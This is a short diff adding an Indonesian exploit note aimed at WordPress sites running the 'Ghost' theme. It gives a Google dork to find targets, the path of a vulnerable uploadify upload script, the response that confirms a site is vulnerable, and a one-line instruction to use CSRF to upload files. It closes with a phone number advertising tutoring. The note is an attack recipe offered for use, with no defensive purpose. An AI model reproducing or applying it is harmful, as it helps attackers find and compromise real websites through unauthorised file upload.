@@ -1,0 +1,13 @@
+Dork:
+     inurl:wp-content/themes/Ghost/
+
+Explot:
+       wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php
+
+Jika vuln:
+          {"status":"NOK", "ERR":"This file is incorect"}
+
+Gunakan csrf untuk mengunci da.n upload
+
+info tutor:
+	   088212171828
